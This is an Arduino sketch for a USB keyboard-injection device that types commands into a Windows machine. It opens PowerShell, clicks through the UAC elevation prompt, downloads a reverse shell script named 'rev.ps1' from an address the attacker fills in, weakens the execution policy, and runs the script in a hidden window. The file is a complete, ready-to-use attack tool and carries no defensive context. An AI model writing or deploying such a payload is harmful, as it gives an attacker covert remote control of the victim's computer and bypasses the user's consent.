#include <Keyboard.h>

void pressKey(int key) {
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}

void pressWinR() {
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  delay(50);
  Keyboard.releaseAll();
  delay(250);
}

void setup() {
  delay(3000);

  pressWinR();
  Keyboard.println("PowerShell");
  
  delay(1000);
  Keyboard.println("Start-Process PowerShell -Verb RunAs; exit;");
  delay(1000);
  pressKey(KEY_LEFT_ARROW);
  pressKey(KEY_RETURN);

  //set address to ur reverse shell file 
  delay(1000);
  Keyboard.println("wget \"http://<address_to_your_file>/rev.ps1\" -outfile \"C:\\rev.ps1\"");

  delay(1000);
  Keyboard.println("Set-ExecutionPolicy RemoteSigned -Force");
  delay(500);
  Keyboard.println("exit");

  pressWinR();
  Keyboard.println("PowerShell.exe -NoLogo -NonInteractive -WindowStyle Hidden -File \"C:\\rev.ps1\"");
}


void loop() {
}